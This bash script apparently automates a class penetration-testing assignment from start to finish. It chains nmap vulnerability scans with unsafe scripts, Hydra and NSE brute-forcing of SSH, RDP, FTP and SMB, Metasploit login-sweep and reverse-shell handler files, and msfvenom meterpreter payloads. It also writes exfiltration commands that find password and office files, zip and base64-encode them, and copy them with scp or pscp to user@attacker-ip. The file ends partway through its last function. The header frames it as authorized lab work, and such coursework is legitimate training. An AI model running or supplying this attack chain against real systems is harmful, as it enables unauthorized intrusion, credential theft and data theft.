#!/usr/bin/env bash

# =========================================================
# Project Breach Point - Automation Script
# =========================================================
# This script implements an end-to-end lab workflow for the
# Breach Point assignment. It assumes you are operating in a
# legal, authorized test environment such as your class lab
# or dedicated test network.
#
# High-level workflow:
#   - Stage 1: Collect user input (target, output dir, basic/full).
#   - Stage 2: Run TCP/UDP scans (basic) and, if chosen, full NSE
#              vulnerability scans with Searchsploit correlation.
#   - Stage 3: Perform weak-credential checks (Hydra, NSE brute scripts).
#   - Stage 4: Generate Metasploit resource (.rc) files.
#   - Stage 5: Generate payloads (msfvenom or suggested commands).
#   - Stage 6: Generate helper commands for data exfiltration (Linux/Windows).
#   - Stage 7: Search results and summarize session + dependencies.
#
# Basic vs Full scans:
#   - basic: TCP/UDP scans, service/version detection, optional quick weak
#            password NSE scan (ssh/ftp/smb/rdp).
#   - full : everything in basic, plus vuln NSE scripts and Searchsploit
#            mapping of results for potential exploitation paths.
#
# Prerequisites / Notes:
#   - Tested on Debian/Ubuntu-style systems with apt-get available.
#   - Uses: nmap, hydra, Metasploit (msfconsole/msfvenom), searchsploit,
#           zip, scp, base64, pscp (for Windows transfers).
#   - The script can attempt to auto-install missing tools via apt-get,
#     but users can decline. Some features will then be degraded/mocked.
#   - Certain scan options (-sS, -O, some NSE scripts) may require root
#     privileges to work reliably.
#
# If you adapt code snippets from external sources (blogs, GitHub, etc.),
# document your references in your project report and/or inline comments.
# =========================================================

set -o nounset
set -o pipefail

########################
# 0. Helper functions  #
########################

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DEFAULT_WORDLIST="$SCRIPT_DIR/wordlists/password.lst"
SESSION_ACTIONS=()
APT_UPDATED=0
SESSION_FINALIZED=0
SESSION_LOG="/tmp/breach_point.log"

# Core tools leveraged across the workflow; used for startup checks and on-demand rechecks.
CORE_TOOLS=(nmap hydra msfconsole msfvenom searchsploit zip scp base64 pscp)
declare -A TOOL_INSTALL_DECISIONS=()

banner() {
    echo "========================================================="
    echo "[*] $1"
    echo "========================================================="
}

pause() {
    read -rp "Press Enter to continue..."
}

log_msg() {
    # Simple log to a file and screen
    local msg="$1"
    local log_target="${SESSION_LOG:-/tmp/breach_point.log}"
    mkdir -p "$(dirname "$log_target")"
    echo "$(date '+%F %T') : $msg" | tee -a "$log_target"
}

# Safely create directories and exit with a useful message if we cannot.
ensure_dir() {
    local dir="$1"
    if mkdir -p "$dir"; then
        return 0
    fi

    log_msg "[!] Failed to create directory: $dir"
    echo "Cannot continue without writable directory: $dir" 1>&2
    exit 1
}

record_action() {
    SESSION_ACTIONS+=("$1")
}

package_for_tool() {
    # Map a tool name to its apt package
    local tool="$1"
    case "$tool" in
        nmap) echo "nmap" ;;
        hydra) echo "hydra" ;;
        msfconsole|msfvenom) echo "metasploit-framework" ;;
        searchsploit) echo "exploitdb" ;;
        zip) echo "zip" ;;
        scp) echo "openssh-client" ;;
        base64) echo "coreutils" ;;
        pscp) echo "putty-tools" ;;
        *) echo "" ;;
    esac
}

# Provide a short description of the workflow features affected by a missing tool.
feature_for_tool() {
    local tool="$1"
    case "$tool" in
        nmap) echo "network scanning, NSE checks, weak-password discovery" ;;
        hydra) echo "weak credential brute forcing" ;;
        msfconsole) echo "Metasploit RC execution and exploitation" ;;
        msfvenom) echo "payload generation" ;;
        searchsploit) echo "vulnerability mapping from scan output" ;;
        zip) echo "Linux exfiltration compression" ;;
        scp) echo "Linux exfiltration transfer to attacker" ;;
        base64) echo "Linux exfiltration encoding" ;;
        pscp) echo "Windows exfiltration transfer to attacker" ;;
        *) echo "" ;;
    esac
}

install_tool() {
    local tool="$1"
    local package
    package="$(package_for_tool "$tool")"

    local log_target="${SESSION_LOG:-/tmp/breach_point_install.log}"

    if ! command -v apt-get >/dev/null 2>&1; then
        log_msg "[!] apt-get is unavailable. Please install $tool manually."
        return 1
    fi

    local apt_cmd="apt-get"
    if [[ "$EUID" -ne 0 ]]; then
        if command -v sudo >/dev/null 2>&1; then
            apt_cmd="sudo apt-get"
        else
            log_msg "[!] Insufficient privileges to install $tool (no sudo)."
            return 1
        fi
    fi

    if [[ -z "$package" ]]; then
        log_msg "[!] No installation mapping for $tool. Please install it manually."
        return 1
    fi

    if [[ "$APT_UPDATED" -eq 0 ]]; then
        log_msg "Running apt-get update before installing $tool (logs: $log_target)"
        if ! DEBIAN_FRONTEND=noninteractive $apt_cmd update -y >>"$log_target" 2>&1; then
            log_msg "[!] apt-get update failed. See $log_target for details. Cannot install $tool automatically."
            return 1
        fi
        APT_UPDATED=1
    fi

    log_msg "Installing $tool via apt-get ($package) (logs: $log_target)"
    if DEBIAN_FRONTEND=noninteractive $apt_cmd install -y "$package" >>"$log_target" 2>&1; then
        log_msg "[+] $tool installed successfully."
        return 0
    fi

    log_msg "[!] Failed to install $tool automatically. See $log_target for details."
    return 1
}

require_tool() {
    local tool="$1"
    if command -v "$tool" >/dev/null 2>&1; then
        TOOL_INSTALL_DECISIONS[$tool]="available"
        return 0
    fi

    local previous_decision="${TOOL_INSTALL_DECISIONS[$tool]:-}"
    if [[ "$previous_decision" == "declined" ]]; then
        log_msg "[!] $tool previously declined; skipping install prompt."
        return 1
    elif [[ "$previous_decision" == "failed" ]]; then
        log_msg "[!] Prior $tool install attempt failed; skipping repeated prompts."
        return 1
    fi

    log_msg "[!] Missing required tool: $tool"

    local INSTALL_TOOL
    if [[ -t 0 ]]; then
        read -rp "$tool is missing. Install it now? [Y/n]: " INSTALL_TOOL
        INSTALL_TOOL="${INSTALL_TOOL:-Y}"
    else
        INSTALL_TOOL="Y"
        log_msg "[i] Non-interactive session detected; defaulting to auto-install for $tool."
    fi

    if [[ "$INSTALL_TOOL" =~ ^[Yy]$ ]]; then
        if install_tool "$tool"; then
            if command -v "$tool" >/dev/null 2>&1; then
                TOOL_INSTALL_DECISIONS[$tool]="available"
                record_action "Installed $tool via package manager"
                return 0
            fi
            log_msg "[!] $tool still not found after installation. Check PATH or install manually."
            TOOL_INSTALL_DECISIONS[$tool]="failed"
            record_action "Install attempted but $tool missing after install"
            return 1
        fi
        TOOL_INSTALL_DECISIONS[$tool]="failed"
        record_action "Install failed for $tool"
        return 1
    fi

    TOOL_INSTALL_DECISIONS[$tool]="declined"
    log_msg "[!] Continuing without $tool."
    record_action "User declined install for $tool"
    return 1
}

ensure_wordlist() {
    mkdir -p "$(dirname "$DEFAULT_WORDLIST")"
    if [[ ! -f "$DEFAULT_WORDLIST" ]]; then
        cat > "$DEFAULT_WORDLIST" <<'EOF'
# Default weak password list for lab use only
password
password1
Password123
admin
admin123
letmein
welcome
123456
123456789
qwerty
EOF
    fi
}

check_core_dependencies() {
    # Give users a one-time opportunity to confirm/decline installation
    # for the core tools used throughout the workflow.
    log_msg "Checking core dependencies: ${CORE_TOOLS[*]}"
    for tool in "${CORE_TOOLS[@]}"; do
        require_tool "$tool"
    done

    log_msg "Dependency status after checks:"
    local missing_tools=()
    for tool in "${CORE_TOOLS[@]}"; do
        local status="${TOOL_INSTALL_DECISIONS[$tool]:-missing}"
        if command -v "$tool" >/dev/null 2>&1; then
            status="available"
            TOOL_INSTALL_DECISIONS[$tool]="available"
        fi
        log_msg " - $tool: $status"
        if [[ "$status" != "available" ]]; then
            missing_tools+=("$tool")
            local feature_hint
            feature_hint="$(feature_for_tool "$tool")"
            if [[ -n "$feature_hint" ]]; then
                log_msg "   \-> impacts: $feature_hint"
            fi
        fi
    done

    if [[ ${#missing_tools[@]} -gt 0 ]]; then
        log_msg "[!] Missing tools remain after install attempts: ${missing_tools[*]}"
        echo "The following tools are still unavailable and related features may be limited: ${missing_tools[*]}" | tee -a "$SESSION_LOG"
        record_action "Dependency check: missing ${missing_tools[*]}"
    else
        record_action "Dependency check: all core tools available"
    fi
}

dependency_status_menu() {
    banner "Dependency Status"
    local missing=()

    record_action "Viewed dependency status"

    for tool in "${CORE_TOOLS[@]}"; do
        local status="${TOOL_INSTALL_DECISIONS[$tool]:-missing}"
        if command -v "$tool" >/dev/null 2>&1; then
            status="available"
            TOOL_INSTALL_DECISIONS[$tool]="available"
        fi
        printf " - %-12s %s\n" "$tool" "$status"
        if [[ "$status" != "available" ]]; then
            missing+=("$tool")
        fi
    done

    if [[ ${#missing[@]} -eq 0 ]]; then
        echo "All tracked dependencies are available." | tee -a "$SESSION_LOG"
        return
    fi

    echo "Missing tools: ${missing[*]}" | tee -a "$SESSION_LOG"
    for tool in "${missing[@]}"; do
        local feature_hint
        feature_hint="$(feature_for_tool "$tool")"
        if [[ -n "$feature_hint" ]]; then
            echo " - $tool impacts: $feature_hint" | tee -a "$SESSION_LOG"
        fi
    done

    if [[ -t 0 ]]; then
        read -rp "Attempt to install missing tools now? [y/N]: " RECHECK
    else
        RECHECK="N"
    fi

    if [[ "$RECHECK" =~ ^[Yy]$ ]]; then
        for tool in "${missing[@]}"; do
            require_tool "$tool"
        done
        record_action "Re-ran dependency installation attempts"
        echo "Updated dependency status:" | tee -a "$SESSION_LOG"
        for tool in "${CORE_TOOLS[@]}"; do
            local status="${TOOL_INSTALL_DECISIONS[$tool]:-missing}"
            if command -v "$tool" >/dev/null 2>&1; then
                status="available"
                TOOL_INSTALL_DECISIONS[$tool]="available"
            fi
            printf " - %-12s %s\n" "$tool" "$status" | tee -a "$SESSION_LOG"
        done
    else
        log_msg "User skipped dependency re-check/installation."
        record_action "Skipped dependency re-check"
    fi
}

dependency_summary_report() {
    log_msg "Final dependency availability snapshot:"
    local missing=()

    for tool in "${CORE_TOOLS[@]}"; do
        local status="${TOOL_INSTALL_DECISIONS[$tool]:-missing}"
        if command -v "$tool" >/dev/null 2>&1; then
            status="available"
            TOOL_INSTALL_DECISIONS[$tool]="available"
        fi
        echo " - $tool: $status" | tee -a "$SESSION_LOG"
        if [[ "$status" != "available" ]]; then
            missing+=("$tool")
            local feature_hint
            feature_hint="$(feature_for_tool "$tool")"
            if [[ -n "$feature_hint" ]]; then
                echo "   \-> impacts: $feature_hint" | tee -a "$SESSION_LOG"
            fi
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        log_msg "[!] Missing tools at session end: ${missing[*]}"
        record_action "Dependency summary: missing ${missing[*]}"
    else
        record_action "Dependency summary: all core tools available"
    fi
}

############################
# 1. Get user input        #
############################

banner "Stage 1 - Getting User Input"

# Inform the user that some scan options may require elevated privileges
if [[ $EUID -ne 0 ]]; then
    echo "[!] Note: You are not running as root. Some scan options"
    echo "    (e.g. -sS, -O, certain NSE scripts) may be limited or fail."
    echo "    For full functionality, consider running this script with sudo."
fi

while :; do
    read -rp "Enter target network (e.g. 192.168.1.0/24): " TARGET_NET
    # Basic sanity check to avoid empty input or obvious whitespace issues
    if [[ -n "$TARGET_NET" && "$TARGET_NET" != *" "* ]]; then
        break
    fi
    echo "Target network cannot be empty or contain spaces."
done

read -rp "Enter name for output directory [default: output]: " OUTDIR
OUTDIR="${OUTDIR:-output}"
ensure_dir "$OUTDIR"
log_msg "Using output directory: $OUTDIR"

# Create a timestamped run folder inside OUTDIR
RUN_ID="$(date '+run_%Y%m%d_%H%M%S')"
RUN_DIR="$OUTDIR/$RUN_ID"
ensure_dir "$RUN_DIR" && ensure_dir "$RUN_DIR/scans" && ensure_dir "$RUN_DIR/credentials" \
    && ensure_dir "$RUN_DIR/metasploit" && ensure_dir "$RUN_DIR/payloads" && ensure_dir "$RUN_DIR/logs"
SESSION_LOG="$RUN_DIR/logs/session.log"
echo "Session log will be written to: $SESSION_LOG"

log_msg "New session started. Target: $TARGET_NET, Output dir: $RUN_DIR"

# Basic or Full
while true; do
    read -rp "Choose scan type [basic/full]: " SCAN_TYPE
    SCAN_TYPE="$(echo "$SCAN_TYPE" | tr '[:upper:]' '[:lower:]')"
    if [[ "$SCAN_TYPE" == "basic" || "$SCAN_TYPE" == "full" ]]; then
        break
    else
        echo "Please enter 'basic' or 'full'."
    fi
done

log_msg "Scan type chosen: $SCAN_TYPE"
ensure_wordlist
DEFAULT_USERLIST="$RUN_DIR/logs/default_users.txt"
cat > "$DEFAULT_USERLIST" <<'EOF'
root
admin
guest
user
test
EOF

check_core_dependencies


##################################
# 2. Recon / Nmap style scans    #
##################################

run_scans() {
    banner "Stage 2 - Network Scanning"
    log_msg "Starting network scans for $TARGET_NET"

    if ! require_tool nmap; then
        echo "Install nmap to enable scanning." | tee -a "$SESSION_LOG"
        record_action "Skipped scans: nmap unavailable"
        return
    fi

    local tcp_out="$RUN_DIR/scans/tcp_scan.txt"
    local tcp_xml="$RUN_DIR/scans/tcp_scan.xml"
    local udp_out="$RUN_DIR/scans/udp_scan.txt"
    local udp_xml="$RUN_DIR/scans/udp_scan.xml"

    banner "TCP scan in progress"
    nmap -sS -sV -O -Pn -T4 -oN "$tcp_out" -oX "$tcp_xml" "$TARGET_NET" | tee -a "$SESSION_LOG"
    record_action "TCP scan saved to $tcp_out"

    banner "UDP scan in progress"
    nmap -sU -sV -Pn -T4 --top-ports 50 -oN "$udp_out" -oX "$udp_xml" "$TARGET_NET" | tee -a "$SESSION_LOG"
    record_action "UDP scan saved to $udp_out"

    if [[ "$SCAN_TYPE" == "full" ]]; then
        banner "Stage 2b - Full Scan: NSE + Vulnerability Check"
        log_msg "Running additional full-scope scans (NSE, vuln checks)"

        local full_out="$RUN_DIR/scans/full_nse_scan.txt"
        local full_xml="$RUN_DIR/scans/full_nse_scan.xml"
        nmap -sS -sV -O -Pn -T4 --script vuln --script-args "unsafe=1" \
            -oN "$full_out" -oX "$full_xml" "$TARGET_NET" | tee -a "$SESSION_LOG"
        record_action "Full scan with NSE saved to $full_out"

        if require_tool searchsploit; then
            local se_out="$RUN_DIR/scans/searchsploit_matches.txt"
            searchsploit --nmap "$full_xml" > "$se_out"
            log_msg "Searchsploit results saved to $se_out"
            record_action "Potential vulnerabilities listed in $se_out"
            if [[ -s "$se_out" ]]; then
                echo "Top Searchsploit matches (see file for full list):" | tee -a "$SESSION_LOG"
                head -n 20 "$se_out" | tee -a "$SESSION_LOG"
            else
                echo "No Searchsploit matches found for the scan results." | tee -a "$SESSION_LOG"
            fi
        else
            log_msg "Searchsploit not found; skipping automatic mapping."
            record_action "Searchsploit unavailable; mapping skipped"
        fi

        if [[ -s "$full_out" ]]; then
            echo "Potential vulnerabilities from NSE output:"
            grep -n "VULNERABLE" -C2 "$full_out" || echo "No explicit 'VULNERABLE' tags found."
        fi
    fi

    local RUN_WEAK="Y"
    if [[ -t 0 ]]; then
        read -rp "Run quick weak-password NSE checks now? [Y/n]: " RUN_WEAK
        RUN_WEAK="${RUN_WEAK:-Y}"
    else
        log_msg "[i] Non-interactive session; defaulting to run quick weak-password NSE checks."
    fi

    if [[ "$RUN_WEAK" =~ ^[Yy]$ ]]; then
        quick_weak_scan
    else
        log_msg "User skipped quick weak-password NSE checks."
        record_action "Skipped quick weak-password NSE checks"
    fi

    record_action "Network scanning complete (${SCAN_TYPE} mode)"
    log_msg "Network scanning completed."
}

quick_weak_scan() {
    banner "Stage 2c - Quick Weak Password Discovery"
    log_msg "Running quick weak-password NSE checks"

    if ! require_tool nmap; then
        echo "Install nmap to enable weak credential NSE checks." | tee -a "$SESSION_LOG"
        record_action "Skipped weak NSE scan: nmap unavailable"
        return
    fi

    local QW_USERLIST="$DEFAULT_USERLIST"
    local QW_PASSLIST="$DEFAULT_WORDLIST"

    if [[ -t 0 ]]; then
        read -rp "User list path for quick NSE brute force [default: $DEFAULT_USERLIST]: " QW_USERLIST
        QW_USERLIST="${QW_USERLIST:-$DEFAULT_USERLIST}"
    else
        log_msg "[i] Non-interactive session; using default user list for quick NSE checks."
    fi

    if [[ ! -f "$QW_USERLIST" ]]; then
        log_msg "[!] Provided user list not found ($QW_USERLIST); falling back to default."
        record_action "Quick NSE user list missing, fell back to default"
        QW_USERLIST="$DEFAULT_USERLIST"
    fi

    if [[ -t 0 ]]; then
        read -rp "Password list path for quick NSE brute force [default: $DEFAULT_WORDLIST]: " QW_PASSLIST
        QW_PASSLIST="${QW_PASSLIST:-$DEFAULT_WORDLIST}"
    else
        log_msg "[i] Non-interactive session; using default password list for quick NSE checks."
    fi

    if [[ ! -f "$QW_PASSLIST" ]]; then
        log_msg "[!] Provided password list not found ($QW_PASSLIST); falling back to default."
        record_action "Quick NSE password list missing, fell back to default"
        QW_PASSLIST="$DEFAULT_WORDLIST"
    fi

    local weak_out="$RUN_DIR/scans/weak_password_scan.txt"
    local weak_xml="$RUN_DIR/scans/weak_password_scan.xml"

    # Include SSH/FTP/SMB/RDP weak-password discovery via NSE scripts.
    nmap -sS -Pn -T4 --script ssh-brute,ftp-brute,smb-brute,rdp-brute \
        --script-args "userdb=$QW_USERLIST,passdb=$QW_PASSLIST,brute.firstOnly=true" \
        -oN "$weak_out" -oX "$weak_xml" "$TARGET_NET" | tee -a "$SESSION_LOG"

    record_action "Weak password NSE scan saved to $weak_out"
    log_msg "Weak password NSE scan completed."
}


##########################################
# 3. Weak Credential Checks (Skeleton)   #
##########################################

weak_credentials() {
    banner "Stage 3 - Weak Credential Checks"
    log_msg "Starting weak credential checks"

    # Ask for password list
    read -rp "Use built-in password list? [Y/n]: " USE_BUILTIN
    USE_BUILTIN="${USE_BUILTIN:-Y}"

    if [[ "$USE_BUILTIN" =~ ^[Yy]$ ]]; then
        PASSLIST="$DEFAULT_WORDLIST"
    else
        read -rp "Enter path to your password list: " PASSLIST
    fi

    if [[ ! -f "$PASSLIST" ]]; then
        log_msg "[!] Provided password list not found ($PASSLIST); falling back to default."
        record_action "Custom password list missing; reverted to default"
        PASSLIST="$DEFAULT_WORDLIST"
    fi

    read -rp "Enter username to test (or file with usernames): " USER_INPUT
    read -rp "Target host for credential testing: " CRED_HOST

    while true; do
        echo "Choose service to test:"
        echo " 1) SSH"
        echo " 2) RDP"
        echo " 3) FTP"
        echo " 4) SMB"
        echo " 0) Done"
        read -rp "Enter choice [0-4]: " SERVICE_CHOICE

        local hydra_proto=""
        local default_port=""
        case "$SERVICE_CHOICE" in
            1) hydra_proto="ssh"; default_port=22 ;;
            2) hydra_proto="rdp"; default_port=3389 ;;
            3) hydra_proto="ftp"; default_port=21 ;;
            4) hydra_proto="smb"; default_port=445 ;;
            0) break ;;
            *) echo "Invalid choice"; continue ;;
        esac

        read -rp "Port to test (default: $default_port): " CHOSEN_PORT
        CHOSEN_PORT="${CHOSEN_PORT:-$default_port}"

        local user_arg=""
        if [[ -f "$USER_INPUT" ]]; then
            user_arg="-L $USER_INPUT"
            record_action "Using supplied username list: $USER_INPUT"
        else
            if [[ "$USER_INPUT" == *"/"* || "$USER_INPUT" == .* ]]; then
                log_msg "[!] Username list not found ($USER_INPUT); falling back to default list."
                record_action "Custom username list missing; reverted to default"
                user_arg="-L $DEFAULT_USERLIST"
            else
                user_arg="-l $USER_INPUT"
            fi
        fi

        local pass_arg="-P $PASSLIST"
        local output_file="$RUN_DIR/credentials/${hydra_proto}_credentials.txt"

        if require_tool hydra; then
            banner "Hydra $hydra_proto brute force"
            hydra -s "$CHOSEN_PORT" -t 4 -f -I -V $user_arg $pass_arg "$CRED_HOST" "$hydra_proto" \
                | tee "$output_file"
            record_action "Hydra $hydra_proto check saved to $output_file"
        else
            echo "Hydra is missing. Suggested command: hydra -s $CHOSEN_PORT $user_arg $pass_arg $CRED_HOST $hydra_proto" \
                | tee "$output_file"
            record_action "Hydra command hint saved to $output_file"
        fi
    done

    record_action "Weak credential checks finished"
    log_msg "Weak credential checks completed."
}


###############################################
# 4. Metasploit .rc File Generation (Skeleton)#
###############################################

generate_msf_rc() {
    banner "Stage 4 - Metasploit Resource File"
    log_msg "Generating Metasploit .rc file(s)"

    echo "Choose .rc type:"
    echo " 1) SSH login exploit/sweep"
    echo " 2) Create handler"
    echo " 3) Run suggester"
    read -rp "Enter choice [1-3]: " RC_CHOICE

    RC_FILE="$RUN_DIR/metasploit/session_${RC_CHOICE}.rc"

    case "$RC_CHOICE" in
        1)
            read -rp "RHOSTS (e.g. 192.168.1.0/24 or host list): " RHOSTS
            read -rp "Username (single) [default: root]: " RC_USER
            RC_USER="${RC_USER:-root}"
            read -rp "Password file [default: $DEFAULT_WORDLIST]: " RC_PASSFILE
            RC_PASSFILE="${RC_PASSFILE:-$DEFAULT_WORDLIST}"
            read -rp "Threads [default: 4]: " RC_THREADS
            RC_THREADS="${RC_THREADS:-4}"
            cat > "$RC_FILE" <<EOF
# Metasploit SSH login RC file (auto-generated)
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $RHOSTS
set USERNAME $RC_USER
set PASS_FILE $RC_PASSFILE
set THREADS $RC_THREADS
run
EOF
            ;;
        2)
            read -rp "Payload type [default: windows/meterpreter/reverse_tcp]: " RC_PAYLOAD
            RC_PAYLOAD="${RC_PAYLOAD:-windows/meterpreter/reverse_tcp}"

            read -rp "LHOST (callback IP/host): " RC_LHOST
            if [[ -z "$RC_LHOST" ]]; then
                echo "LHOST is required; aborting handler RC generation." | tee -a "$SESSION_LOG"
                record_action "Handler RC generation aborted: missing LHOST"
                return
            fi

            read -rp "LPORT [default: 4444]: " RC_LPORT
            RC_LPORT="${RC_LPORT:-4444}"
            if [[ ! "$RC_LPORT" =~ ^[0-9]+$ ]]; then
                echo "LPORT must be numeric; aborting handler RC generation." | tee -a "$SESSION_LOG"
                record_action "Handler RC generation aborted: invalid LPORT"
                return
            fi

            cat > "$RC_FILE" <<EOF
# Metasploit handler RC file (auto-generated)
use exploit/multi/handler
set PAYLOAD $RC_PAYLOAD
set LHOST $RC_LHOST
set LPORT $RC_LPORT
exploit -j
EOF
            ;;
        3)
            read -rp "Existing session ID to run suggester against: " RC_SESSION
            cat > "$RC_FILE" <<EOF
# Metasploit local exploit suggester RC file (auto-generated)
use post/multi/recon/local_exploit_suggester
set SESSION $RC_SESSION
run
EOF
            ;;
        *)
            echo "Invalid choice."
            return
            ;;
    esac

    log_msg "Generated Metasploit RC file at $RC_FILE"
    record_action "Metasploit RC generated at $RC_FILE"

    read -rp "Run msfconsole with this RC file now? [y/N]: " RUN_MSF
    if [[ "$RUN_MSF" =~ ^[Yy]$ ]]; then
        if require_tool msfconsole; then
            log_msg "Launching msfconsole with $RC_FILE"
            msfconsole -r "$RC_FILE"
        else
            log_msg "msfconsole missing; unable to auto-run RC file."
        fi
    else
        echo "Skipping automatic msfconsole run."
    fi
}


###################################
# 5. Payload Generation Skeleton  #
###################################

generate_payload() {
    banner "Stage 5 - Payload Generation"
    log_msg "Starting payload generation"

    read -rp "Enter directory to store payload (default: $RUN_DIR/payloads): " PAYLOAD_DIR
    PAYLOAD_DIR="${PAYLOAD_DIR:-$RUN_DIR/payloads}"
    mkdir -p "$PAYLOAD_DIR"

    read -rp "Enter payload base name (no extension) [default: payload]: " PAYLOAD_NAME
    PAYLOAD_NAME="${PAYLOAD_NAME:-payload}"

    read -rp "Enter LHOST (callback IP/host): " LHOST
    if [[ -z "$LHOST" ]]; then
        echo "LHOST is required; aborting payload generation." | tee -a "$SESSION_LOG"
        record_action "Payload generation aborted: missing LHOST"
        return
    fi

    read -rp "Enter LPORT (callback port) [default: 4444]: " LPORT
    LPORT="${LPORT:-4444}"
    if [[ ! "$LPORT" =~ ^[0-9]+$ ]]; then
        echo "LPORT must be numeric; aborting payload generation." | tee -a "$SESSION_LOG"
        record_action "Payload generation aborted: invalid LPORT"
        return
    fi

    echo "Select payload family:"
    echo " 1) Windows meterpreter reverse_tcp"
    echo " 2) Linux meterpreter reverse_tcp"
    echo " 3) Custom payload string"
    read -rp "Choice [1-3]: " P_CHOICE

    local PAYLOAD=""
    case "$P_CHOICE" in
        1) PAYLOAD="windows/meterpreter/reverse_tcp" ; FORMAT_DEFAULT="exe" ;;
        2) PAYLOAD="linux/x64/meterpreter/reverse_tcp" ; FORMAT_DEFAULT="elf" ;;
        3) read -rp "Enter msfvenom payload string: " PAYLOAD; FORMAT_DEFAULT="raw" ;;
        *) echo "Invalid choice."; return ;;
    esac

    read -rp "Enter output format (e.g. exe, elf, asp, msi) [default: $FORMAT_DEFAULT]: " FORMAT
    FORMAT="${FORMAT:-$FORMAT_DEFAULT}"

    OUTFILE="$PAYLOAD_DIR/${PAYLOAD_NAME}.${FORMAT}"

    if require_tool msfvenom; then
        msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" \
            -f "$FORMAT" -o "$OUTFILE" | tee -a "$SESSION_LOG"
        log_msg "Payload written to $OUTFILE"
        record_action "Payload generated at $OUTFILE"
    else
        echo "msfvenom missing. Suggested command: msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT -o $OUTFILE" \
            | tee -a "$SESSION_LOG"
        record_action "Payload command hint written to session log"
    fi

    log_msg "Payload generation step finished."
}


#########################################
# 6. Data Exfiltration Helper Commands  #
#########################################

data_exfil_helper() {
    banner "Stage 6 - Data Exfiltration Helper"
    log_msg "Preparing data exfiltration helper commands"

    read -rp "Target OS [linux/windows]: " OS
    OS="$(echo "$OS" | tr '[:upper:]' '[:lower:]')"

    read -rp "Target directory to search (default: / or C:\\): " TARGET_ROOT
    if [[ "$OS" == "linux" ]]; then
        TARGET_ROOT="${TARGET_ROOT:-/}"
    else
        TARGET_ROOT="${TARGET_ROOT:-C:\\}"
    fi

    read -rp "Path(s) to compress (you can use globs like /home/user/*.docx; default: results from search): " COMPRESS_PATHS
    read -rp "Attacker SCP destination (e.g. user@10.10.10.1:/tmp) [optional]: " SCP_DEST

    EXFIL_FILE="$RUN_DIR/logs/data_exfil_commands.txt"
    : > "$EXFIL_FILE"

    # Track local availability of helper tools so users know if generated
    # commands might fail without additional setup on their system.
    local missing_exfil_tools=()

    if [[ "$OS" == "linux" ]]; then
        for tool in zip base64 scp; do
            require_tool "$tool" || missing_exfil_tools+=("$tool")
        done

        cat >> "$EXFIL_FILE" <<'EOF'
# Linux - find interesting files
EOF
        echo "find $TARGET_ROOT -type f \\( -iname '*password*' -o -iname '*.docx' -o -iname '*.xlsx' \\) 2>/dev/null" >> "$EXFIL_FILE"
        cat >> "$EXFIL_FILE" <<'EOF'

# Compress to zip
EOF
        if [[ -n "$COMPRESS_PATHS" ]]; then
            # Wrap paths in quotes to reduce issues with spaces
            echo "zip -r /tmp/exfil.zip \"$COMPRESS_PATHS\"" >> "$EXFIL_FILE"
        else
            echo "zip -r /tmp/exfil.zip <FILES_OR_DIRS_HERE>" >> "$EXFIL_FILE"
        fi
        cat >> "$EXFIL_FILE" <<'EOF'

# Base64 encode
base64 /tmp/exfil.zip > /tmp/exfil.zip.b64

# Copy to attacker machine (scp)
EOF
        if [[ -n "$SCP_DEST" ]]; then
            echo "scp /tmp/exfil.zip.b64 $SCP_DEST" >> "$EXFIL_FILE"
        else
            echo "scp /tmp/exfil.zip.b64 user@attacker-ip:/path/" >> "$EXFIL_FILE"
        fi

        record_action "Generated Linux exfiltration helper commands"
    elif [[ "$OS" == "windows" ]]; then
        if ! require_tool pscp; then
            log_msg "[!] pscp not found locally; install PuTTY tools if you plan to run the Windows copy command from this host."
            missing_exfil_tools+=("pscp")
        fi

        cat >> "$EXFIL_FILE" <<'EOF'
REM Windows - find interesting files
EOF
        echo "dir ${TARGET_ROOT} /s /b *password* *.docx *.xlsx" >> "$EXFIL_FILE"
        cat >> "$EXFIL_FILE" <<'EOF'

REM Compress using PowerShell Compress-Archive
EOF
        if [[ -n "$COMPRESS_PATHS" ]]; then
            # Wrap paths in quotes so they still work when containing spaces
            echo "PowerShell Compress-Archive -Path \"$COMPRESS_PATHS\" -DestinationPath C:\\exfil.zip" >> "$EXFIL_FILE"
        else
            echo "PowerShell Compress-Archive -Path <files> -DestinationPath C:\\exfil.zip" >> "$EXFIL_FILE"
        fi
        cat >> "$EXFIL_FILE" <<'EOF'

REM Encode to base64 using certutil
certutil -encode C:\\exfil.zip C:\\exfil.zip.b64

REM Transfer to attacker (scp/WinSCP/etc.)
EOF
        if [[ -n "$SCP_DEST" ]]; then
            echo "pscp C:\\exfil.zip.b64 $SCP_DEST" >> "$EXFIL_FILE"
        else
            echo "pscp C:\\exfil.zip.b64 user@attacker-ip:/path/" >> "$EXFIL_FILE"
        fi

        record_action "Generated Windows exfiltration helper commands"
    else
        echo "Unknown OS type. No commands generated."
        return
    fi

    if [[ ${#missing_exfil_tools[@]} -gt 0 ]]; then
        log_msg "[!] Exfil helper tools unavailable locally: ${missing_exfil_tools[*]}"
        echo "# Note: missing local tools -> ${missing_exfil_tools[*]}" >> "$EXFIL_FILE"
        record_action "Exfil helper tools missing: ${missing_exfil_tools[*]}"
    fi

    log_msg "Data exfiltration helper commands written to $EXFIL_FILE"
    echo "Commands saved to: $EXFIL_FILE"
    record_action "Data exfiltration commands saved to $EXFIL_FILE"
}


############################
# 7. Menu / main workflow  #
############################

show_menu() {
    while true; do
        echo
        echo "================= Main Menu ================="
        echo "1) Run network scans"
        echo "2) Weak credential checks"
        echo "3) Generate Metasploit .rc file"
        echo "4) Generate payload"
        echo "5) Data exfiltration helpers"
        echo "6) Search within results"
        echo "7) Check/install dependencies"
        echo "0) Exit"
        echo "============================================="
        read -rp "Enter choice: " CHOICE

        case "$CHOICE" in
            1) run_scans ;;
            2) weak_credentials ;;
            3) generate_msf_rc ;;
            4) generate_payload ;;
            5) data_exfil_helper ;;
            6) search_results ;;
            7) dependency_status_menu ;;
            0) break ;;
            *) echo "Invalid choice." ;;
        esac
    done
}

search_results() {
    banner "Stage 7 - Search Inside Results"
    read -rp "Enter search term: " TERM
    if [[ -z "$TERM" ]]; then
        echo "Search term cannot be empty." | tee -a "$SESSION_LOG"
        record_action "Search skipped due to empty term"
        return
    fi
    log_msg "User searching results for term: $TERM"

    # Simple recursive grep under RUN_DIR
    grep -Rni --color=always "$TERM" "$RUN_DIR" || echo "No matches found."
